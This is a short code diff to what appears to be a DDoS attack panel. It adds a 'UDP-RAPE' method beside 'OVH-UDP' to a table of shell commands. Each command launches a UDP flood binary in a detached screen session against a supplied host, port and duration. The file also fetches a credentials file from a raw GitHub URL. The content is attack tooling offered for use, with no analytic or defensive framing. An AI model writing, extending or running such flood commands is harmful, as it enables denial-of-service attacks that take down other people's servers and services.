@@ -12,6 +12,7 @@ let PORT = 7777
 
 const METHODS = {
     "OVH-UDP": "screen -dmS %s ./ovh-udp %s %i 4096 1 -1 %i",
+    "UDP-RAPE": "screen -dmS %s ./udp-rape %s %i 4096 1 -1 %i",
 }
 
 fetch("https://raw.githubusercontent.com/xIvan0ff/ServerManager/main/creds.txt")
